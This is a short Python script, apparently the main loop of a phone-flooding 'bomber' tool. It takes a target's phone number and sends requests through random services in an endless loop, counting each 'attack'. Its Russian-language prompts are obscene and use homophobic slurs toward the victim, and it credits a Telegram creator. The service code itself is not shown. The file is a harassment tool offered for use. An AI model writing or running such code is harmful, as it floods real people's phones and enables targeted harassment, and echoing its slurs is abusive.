import sys, os
from StructService import Distribution_Service
from config import attack

attack_number_phone=Distribution_Service()
os.system('clear');print('ЧТОБ РАЗЪЕБАТЬ ПИДОРАСИНЕ СИМ КАРТУ ВВЕДИТЕ НОМЕР ПИДАРАСА')
print('СЕРВИСОВ: МНОГО ЕБАТЬ')
print('СОВЕТ: ПОКА ИДЕТ АТАКА ДРОЧИТЕ НА АНИМЕ ТЯНОК')
print('Создатель: https://t.me/antichristone')

target=input('Phone: ')

try:
    attack_number_phone.phone(target)
except Exception as error:
    print(f'Phone - +7666666666')
    sys.exit()

while True:
    try:
        attack_number_phone.random_service()
        attack += 1
        print(f"РАЗЪЕБ: {attack}")
    except Exception:
        pass

#
